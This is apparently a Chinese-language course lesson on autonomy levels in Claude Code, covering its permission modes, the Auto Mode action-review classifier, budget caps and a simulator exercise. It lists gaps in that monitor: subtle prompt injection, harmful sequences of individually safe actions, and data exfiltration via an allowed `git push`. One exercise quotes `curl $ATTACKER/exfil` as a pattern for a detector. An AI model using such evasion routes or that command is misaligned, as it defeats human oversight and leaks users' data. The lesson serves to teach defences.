# 自主 Agent 的權限模式 (Permission Modes for Autonomous Agents)

> 權限階梯 (permission ladder)，也就是從每個動作都審查到全部核准的分級自主程度，是 harness 管理自主 agent 在不詢問的情況下能做什麼的方式。Claude Code 是這堂課的實作範例，它提供六種這樣的模式："plan" 在每個動作前都詢問，"default"（在 UI 中標為 "Manual"）只對有風險的動作詢問，"acceptEdits" 自動核准檔案寫入但仍會確認 shell 執行，"bypassPermissions" 則核准所有事。Auto Mode，也就是 `auto` 權限模式，用一個獨立的 classifier model 取代逐一動作的核准，它會在每個動作執行前審查，並阻擋任何超出請求範圍的升級行為。動作預算透過 `max_turns` 和 `max_budget_usd` 來強制執行。`auto` 是否可用，取決於方案、組織是否啟用、模型和供應商，而且 Anthropic 明確表示，classifier 單獨使用並不足夠。

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 分鐘

## 問題 (The Problem)

在你的機器上跑的自主 coding agent，是一個獨特的資安類別。攻擊面是 agent 能碰到的一切：檔案系統、網路、憑證、剪貼簿、任何瀏覽器分頁、任何開著的終端機。Bruce Schneier 等人已公開指出：computer-use agent 不是 chatbot 的「功能更新」，而是一種新的工具，有新的風險特性。

Claude Code 的權限系統是 Anthropic 的回應。它不是一個「自主 / 非自主」的單一開關，而是六種橫跨能力階梯的模式：plan → default → acceptEdits → … → bypassPermissions。每種模式是在速度和逐一動作審查之間的不同取捨。Auto Mode（2026 年 3 月）新增一個獨立的 classifier model，把核准從使用者的關鍵路徑上移開：它在每個動作執行前審查，並阻擋任何超出請求範圍的升級。

工程上的問題是：這套系統能抓到什麼、漏掉什麼，以及某個任務實際上該用哪種模式？

## 核心概念 (The Concept)

### 六種權限模式

| 模式 | 行為 | 何時使用 |
|---|---|---|
| `plan` | Agent 提出計畫；使用者核准整份計畫；每個動作在執行前都要審查 | 不熟悉的任務；接近 prod 的程式碼；第一次在某個 repo 上使用 agent |
| `default` | 在 UI 中標為 "Manual"。Agent 執行動作；對任何「有風險」的動作（shell 執行、破壞性操作、網路呼叫）會詢問使用者 | 大多數互動式 coding session |
| `acceptEdits` | 檔案寫入自動核准；shell 執行與網路呼叫仍會詢問 | 跨多個檔案的重構作業 |
| `auto` | 獨立的 classifier model 在每個動作執行前審查；阻擋任何超出請求的升級 | 在受限工作區中的 long-horizon 無人看管執行 |
| `dontAsk` | 從不詢問；未被權限規則預先核准的動作一律拒絕 | 暫時性的 sandbox、CI 工作、研究腳本 |
| `bypassPermissions` | 核准所有事 | 文件記載為「只能用在你願意丟棄的暫時性容器內」 |

（以上名稱與公開的 Claude Code 文件相符；UI 將 `default` 標為 "Manual"。）

### 一頁說明 Auto Mode

Auto Mode（2026 年 3 月 24 日推出）是第一個把逐一動作的核准委派給模型的權限模式。結構：

1. **獨立的 classifier model。** 在每個提議的動作執行前審查，依據宣告的任務與 session 目前的狀態來判斷，並阻擋任何超出請求所需範圍的升級。被阻擋的動作會回到使用者手上。
2. **有條件的可用性。** `auto` 是否提供，取決於方案、組織是否啟用、模型和供應商。

預算控制與 classifier 並行運作：

- `max_turns`：一個 session 的總迭代次數。
- `max_budget_usd`：會中止 session 的金額上限。
- 每個工具的動作次數上限（`WebFetch` 呼叫不超過 N 次，等等）。

### 這套系統能抓到什麼

- 對工具輸入的直接 prompt injection，其中被注入的指令對應到已知有風險的動作形態。
- 重複的工具 loop：classifier 能看出第 N+1 個動作與第 N 個幾乎相同，連續五次。
- 在原本只做檔案編輯的 session 中，明顯超出範圍的 shell 指令。

### 這套系統可能漏掉什麼

- **細微的 prompt injection**：在不產生任何單一被標記動作的情況下，調整行為。間接 prompt injection 並不是完全可以修補的漏洞（OpenAI preparedness 負責人，2025，談瀏覽器 agent，見第 11 課）。
- **語意層級的不當行為。** 每個單獨的動作看起來都安全，但組合起來的 trajectory 卻有害。Classifier 判斷的是動作；它不會重新推導使用者的意圖。
- **透過合法管道外洩。** 把資料寫進你擁有的檔案，然後 `git push` 到公開 repo，是一連串被允許的動作，問題出在它們的組合。

### Research preview 的定位

Anthropic 把 Auto Mode 當作 research preview 推出。文件明確指出，classifier 是一層防護，不是解答：預期使用者會把 Auto Mode 與預算、allowlist、隔離的工作區和 trajectory 稽核（第 12–16 課）搭配使用。Preview 的定位也反映了已記錄的評估與部署落差（第 1 課）：一個通過離線 eval 的 classifier，在真實 session 中使用者脈絡模糊時，可能表現不同。

### 這個階梯在你的工作流程中的位置

- 不熟悉的任務：從 `plan` 開始。讀計畫比 rollback 一次壞掉的執行便宜。
- 已知的重構：`acceptEdits` 能省下很多確認點擊。
- 無人看管的背景執行：只在你已量測過 blast radius 的工作區內使用 `auto`（沒有憑證、沒有 production 掛載、沒有你未同意的對外連線）。
- 暫時性容器：只有在容器及其憑證都是可丟棄的前提下，`dontAsk` / `bypassPermissions` 才可接受。

```figure
autonomy-oversight
```

## 實際使用 (Use It)

`code/main.py` 把動作審查 classifier 模擬成兩階段 pipeline，這是教學上的簡化；真正的 `auto` 模式背後是獨立的 classifier model，而不是有文件記載的兩階段契約。第一階段是對提議動作的低成本關鍵字規則；第二階段是較慢的多規則審查者。驅動程式餵入一小段合成的 trajectory（安全動作、一次 prompt injection 嘗試、一個重複的 loop），並顯示 classifier 在哪裡抓到、在哪裡漏掉。

## 交付 (Ship It)

`outputs/skill-permission-mode-picker.md` 把任務描述對應到適合的權限模式、預算上限，以及所需的隔離。

## 練習 (Exercises)

1. 執行 `code/main.py`。哪種合成動作類型永遠不會被第一階段標記，卻總是被第二階段抓到？哪種兩階段都抓不到？

2. 擴充第一階段的規則集，以抓到某個特定的已知惡意形態（例如 `curl $ATTACKER/exfil`）。在良性動作樣本上量測 false-positive 率。

3. 閱讀 Anthropic 的「How the agent loop works」文件。列出 agent 在 `default` 模式下預設會碰到的每個外部狀態。在無人看管地執行 `auto` 之前，哪些需要另外設限？

4. 設計一個 24 小時無人看管執行的預算：`max_turns`、`max_budget_usd`、每個工具的上限、allowlist。說明每個數字的理由。

5. 描述一條 trajectory，其中每個單獨動作都被 classifier 核准，但組合起來的行為卻是 misaligned。（第 14 課說明 kill switch 與 canary token 如何處理這個問題。）

## 關鍵術語 (Key Terms)

| 術語 | 一般說法 | 實際意義 |
|---|---|---|
| Permission mode | 「Agent 能做多少事」 | 六種具名政策之一，控制逐一動作的核准 |
| plan mode | 「任何事都先問」 | Agent 寫出計畫；使用者在執行前核准 |
| acceptEdits | 「讓它寫檔案」 | 檔案寫入自動核准；shell 執行仍會詢問 |
| auto | 「自動核准」 | 獨立的 classifier model 審查每個動作；阻擋超出請求的升級 |
| bypassPermissions | 「全部放行」 | 核准所有事；適用於暫時性容器 |
| Stage 1 (simulator) | 「快速關鍵字檢查」 | `code/main.py` 中對提議動作的低成本規則 |
| Stage 2 (simulator) | 「深度審查」 | `code/main.py` 中針對被標記動作的較慢多規則審查者 |
| Research preview | 「尚未 GA」 | Anthropic 對失敗模式仍在摸索的功能所用的定位 |

## 延伸閱讀 (Further Reading)

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 權限模式、預算、動作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 託管服務的執行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能範圍與 Auto Mode 發表。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 形塑 classifier 判斷的、以理由為基礎的那一層。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 對 long-horizon 權限設計的內部觀點。
